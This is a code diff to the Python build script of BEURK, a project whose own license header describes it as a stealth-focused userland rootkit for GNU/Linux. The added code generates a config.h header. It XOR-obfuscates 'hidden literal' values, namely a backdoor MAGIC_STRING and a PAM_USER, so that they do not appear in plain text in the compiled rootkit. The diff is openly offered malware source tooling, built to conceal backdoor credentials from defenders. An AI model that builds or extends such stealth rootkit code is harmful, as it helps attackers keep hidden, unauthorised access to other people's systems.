@@ -15,6 +15,13 @@ def abort(msg):
     """
     sys.exit("%s: *** %s ***" % (sys.argv[0], msg))
 
+def fatal_error(msg):
+    """abort with fatal error.
+    it means that something is missing in builder's code
+    and something MUST be patched
+    """
+    sys.exit("[BUILDER FATAL ERROR]: %s" % msg)
+
 if len(sys.argv) != 2:
     help()
 
@@ -26,6 +33,9 @@ if len(sys.argv) != 2:
 def type_str(v):
     assert str(v)
     return str(v)
+
+def type_hidden_literal(v):
+    return type_str(v)
 
 def type_bool(v):
     assert v.lower() in ["true", "false"]
@@ -49,6 +59,8 @@ CONFIG_KEYS = {
         "ENABLE_SSL": type_bool,
         "CC": type_str,
         "XOR_KEY": type_hexbyte,
+        "MAGIC_STRING": type_hidden_literal,
+        "PAM_USER": type_hidden_literal,
         }
 
 def get_config(lines, check_missing_vars=True):
@@ -110,18 +122,104 @@ if ret == 0:
 
 
 ###############################################################################
-### generate config.h
+### generate config.h header file
+
+HEADER = """/*
+ * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
+ * Copyright (C) 2015  unix-thrust
+ *
+ * This file is part of BEURK.
+ *
+ * BEURK is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * BEURK is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
+ */
+
+#pragma once
+
+"""
+
+
+# add all config vars to header
+# (except for type_str and type_hidden_literal)
+macros = ""
+macro_tpl = "#define %(key)s (%(value)s)\n"
+for key, _type in CONFIG_KEYS.items():
+    if _type in [type_str, type_hidden_literal]:
+        continue
+    value = config[key]
+    if _type == type_int:
+        pass
+    elif _type == type_hexbyte:
+        value = hex(value)
+    elif _type == type_bool:
+        value = int(value)
+    else:
+        fatal_error("no determined action for %r" %  _type.__name__)
+    macros += macro_tpl % {"key": key, "value": value}
+
+HEADER += macros
+
+
+# add hidden literals to config.h
 
 def xor(string):
     """xor (obfuscate) given string with XOR_KEY config var
     """
     key = config["XOR_KEY"]
-    result = ""
+    result = "{"
     for char in string:
-        result += "\\x" + hex(ord(char) ^ key)[2:]
+        result += "%s, " % hex(ord(char) ^ key)
+    result += "0x00},"
     return result
 
+literals_code = """
+#define NUM_LITERALS (%(num_literals)d)
+#define MAX_LITERAL_SIZE (%(max_literal_size)d)
 
+static char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE] = {
+    %(literals)s
+};
+
+%(literals_macros)s
+"""
+
+literals = []
+literals_macros = []
+max_literal_size = 0
+num_literals = 0
+macro_tpl = "#define %s ((const char *)(__hidden_literals[%d]))"
+
+for key, _type in CONFIG_KEYS.items():
+    if _type != type_hidden_literal:
+        continue
+    value = config[key]
+    literals.append(xor(value))
+    literals_macros.append(macro_tpl % (key, num_literals))
+    max_literal_size = max(max_literal_size, len(value))
+    num_literals += 1
+
+max_literal_size += 1
+
+HEADER += literals_code % {
+        "literals": "\n    ".join(literals),
+        "max_literal_size": max_literal_size + 1,
+        "num_literals": num_literals,
+        "literals_macros": "\n".join(literals_macros),
+        }
+
+
+# write HEADER into config.h
+open("includes/config.h", 'w').write(HEADER)
 
 
 ###############################################################################
